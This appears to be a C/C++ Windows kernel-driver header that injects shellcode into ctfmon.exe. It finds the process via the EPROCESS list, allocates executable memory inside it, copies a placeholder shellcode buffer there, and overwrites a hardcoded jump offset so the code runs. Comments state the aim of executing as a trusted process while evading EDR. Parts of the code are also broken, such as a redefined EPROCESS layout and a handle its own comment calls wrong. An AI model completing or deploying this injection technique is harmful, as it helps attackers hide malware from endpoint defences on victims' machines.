#pragma once
#include <Windows.h>
#include "Common.h"
#include "utils.h"
#include <ntifs.h>
NTSYSAPI
NTSTATUS
NTAPI
ZwAllocateVirtualMemory(
    _In_    HANDLE    ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _In_    ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T   RegionSize,
    _In_    ULONG     AllocationType,
    _In_    ULONG     Protect
);
#include <ntifs.h>

typedef struct _EPROCESS {
    // Only the part we need here
    LIST_ENTRY ActiveProcessLinks;
    UNICODE_STRING ImageFileName; // Actually a CHAR array in older Windows!
    HANDLE UniqueProcessId;
    // ...
} EPROCESS, * PEPROCESS;
#include <ntdef.h>  // For NT types

#ifdef __cplusplus
extern "C" {
#endif

    NTSYSAPI
        CONST CHAR*
        NTAPI
        PsGetProcessImageFileName(
            _In_ PEPROCESS Process
        );

#ifdef __cplusplus
}
#endif

PEPROCESS FindProcessByName(const char* targetName)
{
    PEPROCESS proc = PsInitialSystemProcess;
    PLIST_ENTRY listHead = &proc->ActiveProcessLinks;
    PLIST_ENTRY listEntry = listHead->Flink;

    while (listEntry != listHead)
    {
        proc = CONTAINING_RECORD(listEntry, EPROCESS, ActiveProcessLinks);

        const char* procName = PsGetProcessImageFileName(proc);
        if (_stricmp(procName, targetName) == 0)
        {
            return proc; // Found it
        }

        listEntry = listEntry->Flink;
    }
    return NULL; // Not found
}

void placeFunc() {
    PVOID baseAddr = utils::get_module_base("ctfmon.exe", nullptr);
	PVOID injectAddr = (PVOID)((char*)baseAddr + 0x021D0); // offset for MsDosCtfMon call ------ "0x21D0: (jmp rax[0x12234])"
    
	// ctfmon.exe	Handles alternative user input like speech / handwriting
	// inject shellcode into ctfmon.exe here, will be executed as admin trusted process evading EDR!
    //get_module_base(const char* module_name, size_t * size_output)
	unsigned char shCode[] = { 0x90 }; // NOP instruction, replace with your shellcode
	PEPROCESS targetEprocess = FindProcessByName("ctfmon.exe");
    NTSTATUS status;
    PVOID baseAddress = NULL;  // Let system choose address
    SIZE_T size = sizeof(shCode);

    KAPC_STATE apcState;
    KeStackAttachProcess((PRKPROCESS)targetEprocess, &apcState);

    status = ZwAllocateVirtualMemory(
        ZwCurrentProcess(),  // Must be the target process handle, see below
        &baseAddress,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
	memcpy(baseAddress, shCode, sizeof(shCode));
	memcpy(injectAddr, &baseAddress, sizeof(baseAddress));
    KeUnstackDetachProcess(&apcState);
}
